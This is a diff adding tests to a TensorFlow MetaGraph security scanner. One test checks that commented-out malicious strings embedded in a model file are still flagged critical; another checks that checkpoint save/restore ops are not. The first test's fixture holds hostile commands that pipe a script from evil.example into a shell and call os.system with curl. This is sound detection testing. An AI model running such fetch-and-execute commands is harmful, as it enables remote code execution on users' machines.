@@ -160,6 +160,28 @@ def test_tf_metagraph_scanner_detects_unsafe_ops_and_executable_payload_signals(
     )
 
 
+def test_tf_metagraph_scanner_comment_token_does_not_suppress_malicious_detection(tmp_path: Path) -> None:
+    malicious_meta = tmp_path / "malicious-comment.meta"
+    malicious_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[
+                {
+                    "name": "pyfunc_node",
+                    "op": "PyFunc",
+                    "attrs": {"func": "# os.system('curl https://evil.example/p.sh | sh')"},
+                }
+            ],
+            collection_bytes={"runtime_hook": [b"# python -c 'import os; os.system(\"curl https://evil.example/x\")'"]},
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))
+
+    assert result.success is False
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+    assert any("Executable String Check" in check.name for check in result.checks)
+
+
 def test_tf_metagraph_scanner_false_positive_control_substring_op_name(tmp_path: Path) -> None:
     false_positive_candidate = tmp_path / "fp.meta"
     false_positive_candidate.write_bytes(
@@ -178,6 +200,23 @@ def test_tf_metagraph_scanner_false_positive_control_substring_op_name(tmp_path:
 
     assert result.success is True
     assert all(issue.severity not in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+def test_tf_metagraph_scanner_checkpoint_io_ops_not_critical(tmp_path: Path) -> None:
+    checkpoint_meta = tmp_path / "checkpoint.meta"
+    checkpoint_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[
+                {"name": "save_op", "op": "SaveV2"},
+                {"name": "restore_op", "op": "RestoreV2"},
+            ]
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(checkpoint_meta))
+
+    assert all(issue.details.get("op_type") not in {"SaveV2", "RestoreV2"} for issue in result.issues)
+    assert all(issue.severity != IssueSeverity.CRITICAL for issue in result.issues)
 
 
 def test_tf_metagraph_scanner_corrupt_protobuf(tmp_path: Path) -> None:
